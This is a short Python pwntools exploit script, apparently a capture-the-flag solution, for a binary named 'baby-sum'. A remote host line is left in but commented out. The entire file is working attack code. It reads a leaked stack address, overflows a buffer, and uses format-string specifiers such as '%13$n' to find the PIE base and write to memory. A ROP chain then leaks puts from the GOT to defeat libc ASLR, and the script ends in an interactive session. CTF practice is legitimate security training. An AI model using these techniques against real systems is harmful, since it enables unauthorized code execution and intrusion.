from pwn import *

elf = ELF("./baby-sum")
libc = elf.libc

target = process([elf.path])
#target = remote("35.244.10.136", 10252)

def sla(s, d):
    target.sendlineafter(s, d)

target.recvuntil(": ")
stack_leak = int(target.recvline().strip(), 0x10)
log.info("Stack Leak: " + hex(stack_leak))

name = "A"*0x28 + p64(stack_leak + 0x30)[:7]
sla("?", name)

sla(">", "%9$lx")
elf.address = int(target.recvline().strip(), 0x10) - 0x1323
log.info("PIE Base: " + hex(elf.address))

sla(">", "%13$n")
sla(">", "%ld")
sla(">", "+")

sla(">", str(-3))
sla(">", "+")

pop_rdi = elf.address + 0x0000000000001433
sla(">", "+")
sla(">", str(pop_rdi))

sla(">", str(elf.got['puts']))
sla(">", str(elf.plt['puts']))

#-(number-of-inputs sent below + 2) at line 27.
sla(">", str(0x4141414141414141))

target.recvline()
target.recvline()
libc.address = u64(target.recvline().strip().ljust(8, '\x00')) - libc.sym['puts']
log.info("LIBC Base: " + hex(libc.address))

target.interactive()
